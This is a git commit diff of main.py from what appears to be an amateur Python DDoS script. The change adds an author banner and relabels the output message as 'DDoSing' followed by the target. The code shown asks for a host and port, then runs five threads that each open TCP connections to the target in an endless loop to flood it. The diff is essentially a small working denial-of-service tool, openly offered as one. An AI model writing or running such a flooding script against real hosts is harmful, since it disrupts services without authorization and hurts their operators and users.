6074fe41360acd94cd2a7d7410702919ed2b0510
Nessy <90691149+LNessy@users.noreply.github.com>
2021-09-14 19:16:57 +0800

    Update main.py

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ import os
 import sys
 import threading
 os.system("cls")
+print("Tools By : Nessy")
 host = input("\nEnter host: ")
 port = int(input("\nEnter port: "))
 print("\n")
@@ -10,7 +11,7 @@ def run(h):
     while True:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((host,port))
-        print("Packet send to " + host)
+        print("DDoSing " + host)
 for i in range(5):
     t = threading.Thread(target=run, args=[i])
     t.start()
